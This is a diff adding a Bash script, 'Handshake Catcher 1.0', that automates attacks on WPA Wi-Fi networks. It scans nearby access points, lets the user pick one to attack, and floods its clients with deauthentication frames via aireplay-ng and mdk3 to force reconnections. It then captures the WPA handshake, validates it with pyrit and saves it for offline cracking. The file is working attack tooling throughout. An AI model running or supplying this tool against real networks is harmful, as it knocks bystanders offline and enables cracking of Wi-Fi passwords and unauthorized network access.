@@ -1,0 +1,458 @@
+#!/usr/bin/env bash
+
+# Script: handshake
+# Version 1.0
+# Date: 15/03/2017
+# Author: mnemonic AKA semeion
+# Description: Automate the handshake capturing process
+# dependencies: aircrack-ng, pyrit, scapy, mdk3
+
+shopt -s extglob
+
+# Check dependencies
+dependencies=(airodump-ng aireplay-ng airmon-ng pyrit scapy mdk3 xterm grep egrep tput wc cut tr awk killall)
+for c in "${dependencies[@]}"; do
+    if ! type "$c" &>/dev/null; then
+        echo "${c}: command not found"
+        exit 1
+    fi
+done
+
+[[ "$PATH" =~ "$PWD" ]] || export PATH=$PATH:$PWD
+[[ "$XDG_CONFIG_HOME" ]] || XDG_CONFIG_HOME="$HOME/.config"
+[[ "$SUDO_USER" ]] && XDG_CONFIG_HOME="/home/$SUDO_USER/.config"
+configdir="$XDG_CONFIG_HOME/handshake-cracker"
+configfile="$configdir/scripts.conf"
+if [ ! -f "$configfile" ]; then
+	echo "Run the 'crack' script to create the config file: $configfile"
+	exit 1
+fi
+
+# check if the file contains something we don't want
+configfile_secured='/tmp/handshake-cracker-secured-scripts.conf'
+if egrep -q -v '^#|^[^ ]*=[^;]*' "$configfile"; then
+	echo "Config file is unclean, cleaning it..." >&2
+	# filter the original to a new file
+	egrep '^#|^[^ ]*=[^;&]*'  "$configfile" > "$configfile_secured"
+	configfile="$configfile_secured"
+fi
+# now source it, either the original or the filtered variant
+source "$configfile"
+
+##################################### Script Configuration
+script_name="${0##*/}"
+tempdir="/tmp/${script_name}"
+CSVDB=dump-01.csv
+
+white="\033[1;37m"
+grey="\033[0;37m"
+red="\033[1;31m"
+green="\033[1;32m"
+yellow="\033[1;33m"
+blue="\033[1;34m"
+cyan="\033[0;36m"
+cafe="\033[0;33m"
+fiuscha="\033[0;35m"
+transparent="\e[0m"
+
+##################################### Windows
+VENTSCAN="-geometry 95x56-0+0"
+VENTHAND="-geometry 95x20-0+0"
+VENTDEAU="-geometry 80x20-0-30"
+
+##################################### Usage: if confirm "Are you sure? "; then ...
+confirm() { local ans IFS=; while read -rp "$1" -n1 ans; do printf '\n'; case $ans in ''|[Yy]) return 0;; [Nn]) return 1;; esac; done; };
+
+##################################### Mata los procesos usados por el script
+function exitmode {
+    clear
+    top
+    echo -e $yellow"          Clearing and quitting..."$transparent
+    echo
+    killall airbase-ng &>/dev/null
+    killall aireplay-ng &>/dev/null
+    killall airodump-ng &>/dev/null
+    killall mdk3 &>/dev/null
+    tput cnorm
+    echo -e "${white}          Removing ${green}temporary files${transparent}"
+    rm -R $tempdir/* &>/dev/null    
+	if [[ "$disable_on_exit" -eq "1" ]]; then
+        echo -e "$white          Disabling Monitor Mode on ${green}${WIFI}${transparent}"
+        airmon-ng stop $WIFI &> /dev/null
+    fi
+    echo
+    exit
+}
+trap exitmode SIGINT SIGHUP
+
+##################################### Cabecera ASCII
+function top {
+    echo -en "\e[3J"
+    echo
+    echo -e "$green       ##########################################################"
+    echo -e "$green       #                                                        #"
+    echo -e "$green       #           HANDSHAKE CATCHER 1.0 by mnemonic            #"
+    echo -e "$green       #                                                        #"
+    echo -e "$green       ########################################################## ${transparent}"
+    echo
+}
+
+##################################### Muestra la info del AP seleccionado
+function info_router {
+    Host_MAC_info1=`echo "${Host_MAC}" | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' | tr [:upper:] [:lower:]`
+    Host_MAC_MODEL=`macchanger -l | grep "${Host_MAC_info1}" | cut -d " " -f 5-`
+    echo -e "${yellow}                   SELECTED ROUTER:${transparent}"
+    echo
+    echo -e "              ${cyan}ESSID${transparent} : ${Host_SSID} / ${Host_ENC}"
+    echo -e "            ${cyan}Channel${transparent} : ${Host_CHAN}"
+    echo -e "                ${cyan}MAC${transparent} : ${Host_MAC} (${Host_MAC_MODEL})"
+    echo -e "          ${cyan}Handshake${transparent} : ${green}${Host_CATCHED}${transparent}"
+    echo
+    echo -e "${yellow}          handshake status: $Handshake_statuscheck"
+    echo
+}
+
+##################################### Select Wifi adapter
+function select_interface {
+    local ifaces=()
+	for iface in /sys/class/net/wl*; do
+	    if [[ "$iface" != "/sys/class/net/wl*" ]]; then
+			ifaces+=($(basename $iface))
+		fi
+	done
+    local nr_ifaces=${#ifaces[@]}
+    local choice
+    if [ "$nr_ifaces" -gt "0" ]; then
+        if [ "$nr_ifaces" -eq "1" ]; then
+            WIFI="${ifaces[0]}"
+            set_monitor_mode
+        else
+            while [[ 1 ]]; do
+                clear
+                top
+                echo -e "$yellow          Select the Wifi adapter:"
+                echo
+                local i=0
+                for line in "${ifaces[@]}"; do
+                    i=$(($i+1))
+                    echo -e "${yellow}          ${i})${transparent} $line"
+                done
+                echo
+                echo -n "          #? "
+                read -s -r -n 1 choice
+                echo "$choice"
+                choice=$(($choice-1))
+                if (( choice >= 0 && choice < "${#ifaces[@]}" )); then
+                    break
+                fi
+            done
+            WIFI="${ifaces[$choice]}"
+            set_monitor_mode
+        fi
+    else
+        echo -e "          No Wifi adapter. Finishing..."
+        sleep 3
+        exitmode
+    fi
+}
+
+function set_monitor_mode {
+    if [[ ! "${WIFI}" =~ "mon" ]]; then
+        echo
+        echo -ne "$white          Enabling Monitor Mode on ${yellow}${WIFI}${transparent}..."
+        WIFI=$(airmon-ng start $WIFI | grep "monitor mode vif enabled for" | cut -d']' -f3 | sed -e 's/)//g')
+        disable_on_exit="1"
+    fi
+}
+
+##################################### Selección del Canal
+function select_scan_mode {
+    local choice
+    while true; do
+        clear
+        top
+        echo -e "${yellow}          Select Scan Mode:"
+        echo
+        echo -e "          ${yellow}1)${transparent} All Channels"
+        echo -e "          ${yellow}2)${transparent} Specified Channels"
+        echo -e "          ${yellow}3)${transparent} Quit"
+        echo
+        echo -n "          #> "
+        read -s -r -n 1 choice
+        if (( choice >= 1 && choice <= 3 )); then
+            break
+        fi
+    done
+    case "$choice" in
+        1 ) Scan ;;
+        2 ) Scanchan ;;
+        3 ) exitmode ;;
+    esac
+}
+
+function msgscan {
+    clear
+    top
+    echo -e "${yellow}          Getting list of routers available in the area...$transparent"
+    echo
+    echo -e "          Hit Ctrl-C on ${yellow}SCANNING$transparent window to finish..."
+    echo -e "          $grey(Approximately 40-60 seconds to detect all routers)"$transparent
+}
+
+##################################### Elegir canal(es) si se optó por la opción 2
+function Scanchan {
+    if ps -A | grep -q airodump-ng; then killall airodump-ng; fi
+    if ps -A | grep -q aireplay-ng; then killall aireplay-ng; fi
+    if ps -A | grep -q mdk3; then killall mdk3; fi
+    clear
+    top
+    echo -e $yellow"          Select the channel(s) to scan:"$transparent
+    echo
+    echo -e "          Unique channel "$blue"(example): "$green"6"$transparent""
+    echo -e "          Range of channels "$blue"(example): "$green"1-5"$transparent""
+    echo -e "          Multiple channels "$blue"(example): "$green"1,2,5-7,11"$transparent""
+    echo
+    echo -n "          #> "
+    read channel_number
+    set -- ${channel_number}
+    msgscan
+    rm -rf $tempdir/* &>/dev/null
+    xterm -title "SCANNING channel(s) [$channel_number]" $VENTSCAN -bg "#000000" -fg "#FFFFFF" -e airodump-ng --encrypt WPA -w $tempdir/dump --channel "$channel_number" -a $WIFI --ignore-negative-one 
+}
+
+##################################### Escanea toda la red con airodump-ng
+function Scan {
+    if ps -A | grep -q airodump-ng; then killall airodump-ng; fi
+    if ps -A | grep -q aireplay-ng; then killall aireplay-ng; fi
+    if ps -A | grep -q mdk3; then killall mdk3; fi
+    msgscan
+    rm -rf $tempdir/* &>/dev/null
+    xterm -title "SCANNING" $VENTSCAN -bg "#000000" -fg "#FFFFFF" -e airodump-ng --encrypt WPA -w $tempdir/dump -a $WIFI --ignore-negative-one
+}
+
+##################################### Elegir una red del listado
+function select_router {
+    if ps -A | grep -q airodump-ng; then killall airodump-ng; fi
+    if ps -A | grep -q aireplay-ng; then killall aireplay-ng; fi
+    if ps -A | grep -q mdk3; then killall mdk3; fi
+    clear
+    top
+    local LINEAS_WIFIS_CSV=`wc -l $tempdir/$CSVDB | awk '{print $1}'`
+    if [ "$LINEAS_WIFIS_CSV" -le 3 ]; then
+        clear
+        rm -rf $tempdir/*
+        echo "select_router - LINEAS_WIFIS_CSV - && break"
+        sleep 8
+        exitmode
+    fi
+
+    local wifionap=`cat "$tempdir/$CSVDB" | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
+    local wifionap=`expr $wifionap - 1`
+    head -n "$wifionap" "$tempdir/$CSVDB" &> "$tempdir/dump-02.csv"
+    tail -n "+$wifionap" "$tempdir/$CSVDB" &> "$tempdir/clientes.csv"
+    echo "  Nº    MAC                     CHANNEL  TYPE     PWR   HNDSHK     ESSID"
+    echo
+    local i=0
+    while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY; do
+        longueur=${#MAC}
+        if [ "$longueur" -ge 17 ]; then
+            i=$(($i+1))
+            PRIVACY=$(echo "$PRIVACY" | tr -d "^ ")
+            PRIVACY="${PRIVACY:0:4}"
+            POWER=`expr $POWER + 100`
+            CLIENTE=`cat "$tempdir/clientes.csv" | grep "$MAC"`
+            if [ -f "${handshakes_dir}/${MAC}.cap" ]; then
+                CATCHED="YES"
+            else
+                CATCHED=""
+            fi
+            if [ "$CLIENTE" != "" ]; then
+                CLIENTE="*"
+                echo -e " ${red} ${i})${green}${CLIENTE}\t${red}${MAC}\t${red} ${CHANNEL}\t${green} ${PRIVACY}\t  ${red}${POWER}%\t${red} ${CATCHED}\t${red}${ESSID}${transparent}"
+            else
+                echo -e " ${green} ${i})${white}${CLIENTE}\t${yellow}${MAC}\t${green} ${CHANNEL}\t${blue} ${PRIVACY}\t  ${yellow}${POWER}%\t${green} ${CATCHED}\t${green}${ESSID}${transparent}"
+            fi
+            achannel["$i"]="$CHANNEL"
+            amac["$i"]="$MAC"
+            aprivacy["$i"]="$PRIVACY"
+            aspeed["$i"]="$SPEED"
+            ahost_catched["$i"]="$CATCHED"
+            ahost_ssid["$i"]=${ESSID# }             ### remove leading whitespace
+            ahost_ssid["$i"]=${ahost_ssid[$i]#\"}   ### remove leading "
+            ahost_ssid["$i"]=${ahost_ssid[$i]%\"}   ### remove trailing "
+        fi
+    done < "$tempdir/dump-02.csv"
+    echo
+    echo -e "          ${red}(${green}*${red})${white} In red: networks with potential active clients${transparent}"
+    echo
+    echo -e "${yellow}          Select a number to attack ${transparent}(${yellow}r${grey}escan/${yellow}q${transparent}uit):"
+    echo
+    echo -n "          #> "
+    read choice
+
+    case "$choice" in
+        +([0-9]))
+                if (( choice > 0 && choice <= i )); then
+                    if exist_handshake "${amac[$choice]}" "${ahost_ssid[$choice]}"; then
+                        #~ Handshake_statuscheck="${green}Good handshake!${transparent}"
+                        if confirm "          A good handshake already exist! Select another target? (Y/n): "; then
+                            select_router
+                        else
+                            #~ rm "$handshakes_dir/${amac[$choice]}.cap"
+                            Handshake_statuscheck="${red}None or Invalid handshake.${transparent}"
+                        fi
+                    else
+                        Handshake_statuscheck="${red}None or Invalid handshake.${transparent}"
+                    fi
+                else
+                      select_router
+                fi
+                ;;
+        r) select_scan_mode
+           select_router;;
+        q) exitmode;;
+        *) select_router;;
+    esac
+    Host_SPEED="${aspeed[$choice]}"
+    Host_ENC="${aprivacy[$choice]}"
+    Host_MAC="${amac[$choice]}"
+    Host_CHAN=$(echo "${achannel[$choice]}" | tr -d [:space:])
+    Host_SSID="${ahost_ssid[$choice]}"
+    Host_CATCHED="${ahost_catched[$choice]}"
+}
+
+# input: BSSID ESSID
+# return: boolean
+function exist_handshake {
+    local handshakefile="${handshakes_dir}/${1}.cap"
+    if [ -f "$handshakefile" ]; then
+        local Host_SSID_loc=$(pyrit -r "$handshakefile" analyze 2>&1 | grep "^#" | cut -d "(" -f2 | cut -d "'" -f2)
+        local Host_MAC_loc=$(pyrit -r "$handshakefile" analyze 2>&1 | grep "^#" | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')
+        if [[ "$Host_MAC_loc" == *"$1"* ]] && [[ "$Host_SSID_loc" == *"$2"* ]] && pyrit -r $handshakefile analyze 2>&1 | grep -v "AccessPoint" | grep -q 'good[*]\?,'; then
+            return 0
+        else
+            return 1
+        fi
+    else
+        return 1
+    fi
+}
+
+function deauth_all {
+    if ps -A | grep -q aireplay-ng; then
+        killall aireplay-ng
+    fi
+    xterm -title "Deauth all clients in $Host_SSID" $VENTDEAU -bg "#000000" -fg "#FF0009" -e aireplay-ng --deauth 9999999999999 -a $Host_MAC --ignore-negative-one $WIFI &> /dev/null &
+}
+
+function deauth_mdk3 {
+    if ps -A | grep -q mdk3; then
+        killall mdk3
+    fi
+    echo "$Host_MAC" >$tempdir/mdk3.txt
+    xterm -title "Deauth all clients in $Host_SSID" $VENTDEAU -bg "#000000" -fg "#FF0009" -e mdk3 $WIFI d -b $tempdir/mdk3.txt -c $Host_CHAN &> /dev/null &
+    #~ mdk3PID=$!
+}
+
+# Deauth to specific targets
+function deauth_quickly {
+    targets=$(cat $tempdir/${Host_MAC}-01.csv | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -v $Host_MAC)
+    if ps -A | grep -q aireplay-ng; then
+        killall aireplay-ng
+    fi
+    for target in $targets; do
+        target_MAC=${target:0:17}
+        xterm -title "Deauthenticating $target_MAC..." $VENTDEAU -bg "#000000" -fg "#FF0009" -e aireplay-ng -0 $deauth_time -a $Host_MAC -c $target_MAC --ignore-negative-one $WIFI &> /dev/null
+    done
+}
+
+##################################### Capturando Handshake
+function capture_handshake {
+    if ps -A | grep -q airodump-ng; then
+        killall airodump-ng
+    fi
+    rm -rf $tempdir/$Host_MAC*
+    Handshake_statuscheck="${cyan}Capturing handshake...${transparent}"
+    xterm -title "Capturing Handshake $Host_SSID" $VENTHAND -bg "#000000" -fg "#FFFFFF" -e airodump-ng --ignore-negative-one --bssid $Host_MAC -w $tempdir/$Host_MAC --channel $Host_CHAN -a $WIFI &> /dev/null &
+}
+
+##################################### Comprueba el handshake antes de continuar
+function check_handshake {
+    pyrit -r $tempdir/$Host_MAC-01.cap -o $tempdir/test.cap stripLive &>/dev/null
+    local Host_SSID_loc=$(pyrit -r "$tempdir/test.cap" analyze 2>&1 | grep "^#" | cut -d "(" -f2 | cut -d "'" -f2)
+    local Host_MAC_loc=$(pyrit -r "$tempdir/test.cap" analyze 2>&1 | grep "^#" | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')
+    if [[ "$Host_MAC_loc" == *"$Host_MAC"* ]] && [[ "$Host_SSID_loc" == *"$Host_SSID"* ]] && pyrit -r $tempdir/test.cap analyze 2>&1 | grep -v "AccessPoint" | grep -q 'good[*]\?,'; then
+        # Save handshake
+        pyrit -r $tempdir/test.cap -o $handshakes_dir/$Host_MAC.cap strip &>/dev/null
+        Host_CATCHED="YES"
+        Handshake_statuscheck="${green}Good handshake!${transparent}"
+        rm $tempdir/test.cap &>/dev/null
+        if ps -A | grep -q airodump-ng; then
+            killall airodump-ng
+        fi
+    else
+        Handshake_statuscheck="${red}None or Invalid handshake.${transparent}"
+        rm $tempdir/test.cap &>/dev/null
+        capture_handshake
+    fi
+}
+
+##################################### Run as Root
+if [[ $EUID -ne 0 ]]; then
+    echo -e "Run as Root."
+    exit 1
+fi
+
+##################################### Crea las carpetas de trabajo
+if [ ! -d $tempdir ]; then mkdir -p $tempdir &>/dev/null; fi
+if [ ! -d $handshakes_dir ]; then mkdir -p $handshakes_dir &>/dev/null; fi
+
+##################################### Title
+clear
+top
+select_interface
+select_scan_mode
+select_router
+
+#~ if exist_handshake "$Host_MAC" "$Host_SSID"; then
+    #~ Handshake_statuscheck="${green}Handshake Found.${transparent}"
+    #~ clear
+    #~ top
+    #~ info_router
+    #~ if confirm "A good handshake for ${Host_SSID} already exist, use it? (Y/n): "; then
+        #~ exitmode
+    #~ else
+        #~ rm "$handshakes_dir/$Host_MAC.cap"
+    #~ fi
+#~ fi
+
+#~ Handshake_statuscheck="${red}None or Invalid handshake.${transparent}"
+#~ clear
+#~ top
+#~ info_router
+
+while [ 1 ]; do
+    clear
+    top
+    info_router
+    echo -e "          ${yellow}1)${transparent} Start/Check/Save handshake capture"
+    echo -e "          ${yellow}2)${transparent} Restart handshake capture"
+    echo -e "          ${yellow}3)${transparent} Deauth each client quickly"
+    echo -e "          ${yellow}4)${transparent} Deauth all using aireplay-ng"
+    echo -e "          ${yellow}5)${transparent} Deauth all using mdk3"
+    echo -e "          ${yellow}6)${transparent} Select another router"
+    echo -e "          ${yellow}7)${transparent} Quit"
+    echo
+    echo -n "          #> "
+    read -s -r -n 1 choice
+    case $choice in
+        1 ) check_handshake;;
+        2 ) capture_handshake;;
+        3 ) deauth_quickly;;
+        4 ) deauth_all;;
+        5 ) deauth_mdk3;;
+        6 ) select_router
+            Handshake_statuscheck="${red}None or Invalid handshake.${transparent}";;
+        7|q) exitmode;;
+    esac
+done
